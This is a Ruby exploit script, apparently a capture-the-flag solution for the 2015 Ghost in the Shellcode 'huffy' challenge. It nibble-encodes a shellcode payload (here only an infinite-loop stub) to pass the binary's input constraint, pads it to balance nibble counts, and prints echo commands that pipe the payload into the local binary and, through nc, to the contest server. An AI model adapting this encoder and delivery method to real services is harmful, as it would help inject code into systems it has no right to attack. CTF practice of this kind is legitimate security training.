shellcode = "\xeb\xfe"

@@table = {
  "0000" => 0x0, "0001" => 0x1, "0011" => 0x2, "0010" => 0x3,
  "0110" => 0x4, "0111" => 0x5, "0101" => 0x6, "0100" => 0x7,
  "1100" => 0x8, "1101" => 0x9, "1111" => 0xa, "1110" => 0xb,
  "1010" => 0xc, "1011" => 0xd, "1001" => 0xe, "1000" => 0xf,
}

@@hist = [ 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, ]

def encode_nibble(b)
  binary = b.to_s(2).rjust(4, '0')
  puts("Looking up %s... => %x" % [binary, @@table[binary]])
  return @@table[binary]
end

def get_padding()
  result = ""
  max = @@hist.max
  puts(@@hist.join(", "))
  puts("max = #{max}")

  needed_nibbles = []
  0.upto(@@hist.length - 1) do |i|
    needed_nibbles << [i] * (max - @@hist[i])
    needed_nibbles.flatten!
  end

  puts("We need to add these nibbles: " + needed_nibbles.join(", "))

  if((needed_nibbles.length % 2) != 0)
    puts("We need an odd number of nibbles! Add some NOPs or something :(")
    exit
  end

  0.step(needed_nibbles.length - 1, 2) do |i|
    n1 = needed_nibbles[i]
    n2 = needed_nibbles[i+1]

    result += ((encode_nibble(n1) << 4) | (encode_nibble(n2) & 0x0f)).chr
  end

  return result
end

def output(str)
  print "echo -ne '"
  str.bytes.each do |b|
    print("\\x%02x" % b)
  end
  puts("' > in; ./huffy < in")

  print "echo -ne '"
  str.bytes.each do |b|
    print("\\x%02x" % b)
  end
  puts("' | nc -vv huffy.2015.ghostintheshellcode.com 8143")
end

out = ""
shellcode.each_byte do |b|
  n1 = b >> 4
  n2 = b & 0x0f

  puts("n1 = %x" % n1)
  puts("n2 = %x" % n2)

  @@hist[n1] += 1
  @@hist[n2] += 1

  out += ((encode_nibble(n1) << 4) | (encode_nibble(n2) & 0x0F)).chr
end

out += get_padding()

hack_table = {
  0x02 => 0x08, 0x0d => 0x09, 0x00 => 0x00, 0x08 => 0x02,
  0x0f => 0x01, 0x07 => 0x03, 0x03 => 0x07, 0x0c => 0x06,
  0x04 => 0x04, 0x0b => 0x05, 0x01 => 0x0f, 0x0e => 0x0e,
  0x06 => 0x0c, 0x09 => 0x0d, 0x05 => 0x0b, 0x0a => 0x0a
}

hack_out = ""

out.bytes.each do |b|
  n1 = hack_table[b >> 4]
  n2 = hack_table[b & 0x0f]

  hack_out += ((n1 << 4) | (n2 & 0x000f)).chr
end
output(hack_out)




